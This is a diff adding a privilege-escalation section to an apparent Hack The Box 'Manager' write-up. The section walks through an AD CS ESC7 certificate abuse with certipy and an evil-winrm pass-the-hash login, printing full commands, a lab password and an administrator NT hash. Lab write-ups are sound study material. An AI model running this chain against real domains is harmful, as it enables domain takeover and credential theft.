@@ -267,4 +267,101 @@ evil-winrm -i dc01.manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
 
 ## Privilege escalation
 
-WIP
+Could not get it in time, but here's how it was done by another people: https://0xdf.gitlab.io/2024/03/16/htb-manager.html#box-info
+
+After getting the user flag, a little bit of lurking around the machine did not provide anything interesting. So, we'll explore Active Directoy Certificate Service with `certipy`.
+
+```bash
+certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
+[!] Vulnerabilities
+      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
+```
+
+Nice, now we can explote this `ESC7` vulnerability: ESC7 is when a user has either the "Manage CA" or "Manage Certificates" access rights on the certificate authority itself. Raven has ManageCa rights.
+
+First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:
+
+```bash
+certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
+```
+
+Now raven appears in the find as certificate manager:
+
+```bash
+certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
+...[snip]...
+        ManageCertificates              : MANAGER.HTB\Administrators
+                                          MANAGER.HTB\Domain Admins
+                                          MANAGER.HTB\Enterprise Admins
+                                          MANAGER.HTB\Raven
+```
+
+Now, we will try to retrieve the Administrator certificate to connect with evil-winrm as administrator.
+
+First: Request the admin cert:
+
+```bash
+certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)                             
+
+[*] Requesting certificate via RPC                         
+[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
+[*] Request ID is 13
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 13.key
+[-] Failed to request certificate
+```
+
+This fails, but we can keep the private key. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
+
+```bash
+certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+                                                                    
+[*] Successfully issued certificate
+```
+
+Now, the issued certificate can be retrieved using the req command:
+
+```bash
+certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)    
+                                                                    
+[*] Rerieving certificate with ID 13          
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@manager.htb'
+[*] Certificate has no object SID
+[*] Loaded private key from '13.key'                     
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync.
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236                                   
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@manager.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
+```
+
+With the hash, we can connec to evil-winrm:
+
+```bash
+oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+and grab the root.txt file
